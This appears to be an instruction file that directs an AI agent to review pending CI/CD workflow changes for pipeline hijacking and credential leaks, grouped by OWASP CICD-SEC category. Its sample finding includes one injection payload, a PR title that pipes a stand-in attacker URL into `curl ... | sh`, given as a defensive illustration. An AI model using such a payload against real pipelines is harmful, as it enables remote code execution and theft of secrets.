# CI Workflow Review

Review the **pending changes on the current branch** that touch CI/CD pipeline
configuration — GitHub Actions workflows, GitLab CI, Jenkins, and similar — for
the ways a pipeline can be hijacked or made to leak credentials. Findings are
classified against the
[OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
(CICD-SEC-1–10), with concrete patterns drawn from GitHub's
[security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
guidance; the patterns generalize to other CI systems. Pair with
`dependency-review` for the packages a build installs and `security-review`
for application code.

Pipeline config is code that runs with credentials. Treat every value an
outside contributor can influence — PR titles and bodies, branch names, commit
messages, author names, issue text — as attacker-controlled input that must
never reach a shell or a privileged context unquoted. Exploitability hinges on
**who can trigger the workflow** and **what the job can reach**: establish
both before judging severity.

## Scope

1. Determine the diff: `git diff <base>...HEAD` (default base: `main`/`master`),
   plus any uncommitted or untracked changes. If you are already on the base
   branch, review the uncommitted changes instead.
2. Focus on pipeline files: `.github/workflows/*`, action definitions
   (`action.yml`), reusable workflows, `.gitlab-ci.yml`, `Jenkinsfile`,
   `azure-pipelines.yml`, `.circleci/`, Buildkite/Tekton configs.
3. Read the whole workflow around each hunk, not just the diff — triggers,
   `permissions`, and secrets interact across the file, and a guard may sit
   outside the changed lines.
4. For each changed job, establish the trigger surface: can a fork PR, an
   issue event, or an unauthenticated actor cause it to run, and with which
   token and secrets?

## What to look for (by CICD-SEC category)

### Poisoned pipeline execution & injection (CICD-SEC-4, CICD-SEC-1)

- **Untrusted interpolation into scripts** — expressions such as
  `${{ github.event.pull_request.title }}`, `.body`, branch names, commit
  messages, or author names expanded inside `run:` — attacker-controlled text
  becomes shell. Route the value through `env:` and reference it quoted
  (`"$TITLE"`), or pass it as an action argument.
- **Privileged trigger + untrusted code** — `pull_request_target` or
  `workflow_run` combined with a checkout of the PR head
  (`ref: github.event.pull_request.head.sha`) runs attacker code with secrets
  and a write token.
- Executing files an outside contributor can modify (build scripts, Makefiles,
  `package.json` lifecycle hooks) inside a privileged job.
- Deploy or release jobs newly reachable without a required review,
  environment protection rule, or branch gate (insufficient flow control).

### Credential hygiene & token scope (CICD-SEC-6, CICD-SEC-5, CICD-SEC-2)

- Missing or broadened `permissions:` — the workflow inherits a broad default
  `GITHUB_TOKEN`; set `permissions: contents: read` at the top and raise
  per-job only as needed.
- Secrets in plaintext in the pipeline file; secrets passed as command-line
  arguments (visible in logs and process lists); derived/transformed secrets
  that will not be masked; a whole JSON credential blob where one field is
  needed.
- Secrets or privileged runners newly exposed to jobs that fork PRs can
  trigger.
- Long-lived cloud keys stored as secrets where short-lived OIDC federation
  is available.

### Third-party steps (CICD-SEC-3, CICD-SEC-8)

- Actions, orbs, or plugins referenced by **mutable tag or branch**
  (`uses: some/action@v3`, `@main`) instead of a full commit SHA — the only
  immutable reference; a compromised action sees every secret its job gets.
- New third-party steps or reusable workflows from outside the org with no
  provenance check.

### Artifacts, caches & runners (CICD-SEC-9, CICD-SEC-7)

- Artifacts produced by an untrusted workflow run consumed by a privileged
  job without validation; caches writable from fork PRs feeding privileged
  builds (cache poisoning).
- Self-hosted runners exposed to public-repo or fork-PR workloads; secrets
  and credentials resident on the runner image.
- `continue-on-error:` added to a security check; debug flags that echo
  secrets or environment into logs (also CICD-SEC-10).

## Output

Report each finding as a single list item:

- **[severity] CICD-SEC category** — `file:line`
  **Issue:** who can trigger it, what they control, and what they gain.
  **Fix:** the concrete change (quote via `env:`, drop the privileged trigger,
  pin the SHA, scope `permissions:`).

`severity` reflects who can trigger it and what they get: **critical** — an
outside contributor can run code with secrets or a write token (script
injection in a fork-triggerable workflow, `pull_request_target` + head
checkout); **high** — broad token or secret exposure, or an unpinned
third-party step inside a privileged job; **medium** — hardening gaps
exploitable only by collaborators; **low** — hygiene. The classifier is the
CICD-SEC category (e.g. `CICD-SEC-4 Poisoned Pipeline Execution`). Order
findings by severity, highest first, keeping one issue per finding.
For example:

- **[critical] CICD-SEC-4 Poisoned Pipeline Execution** — `.github/workflows/greet.yml:14`
  **Issue:** `run: echo "Thanks for ${{ github.event.pull_request.title }}"`
  expands the attacker-controlled PR title directly into bash in a workflow
  fork PRs can trigger — a title like `"; curl https://evil.sh | sh` executes
  arbitrary code with the job's token.
  **Fix:** pass the title via `env:` (`TITLE: ${{ github.event.pull_request.title }}`)
  and reference it quoted (`"$TITLE"`).

Verify before reporting: check the changed job's actual trigger and
`permissions` before calling something exploitable — the same interpolation is
critical under a fork-triggerable event and low in a manually dispatched
maintainer job — quote the offending line in the Issue, and drop anything
without a concrete attacker path. Prefer the few findings that matter; if more
than ~10 survive, report the ones worth a human's time and summarize the rest
in a line.

Open the report with one line stating what was reviewed and the outcome, e.g.
`Reviewed main..HEAD (2 workflows): 1 finding, critical.` If the diff touches
no pipeline configuration, say so rather than reviewing application code. If
the pipeline changes are sound, say so explicitly rather than manufacturing
findings.
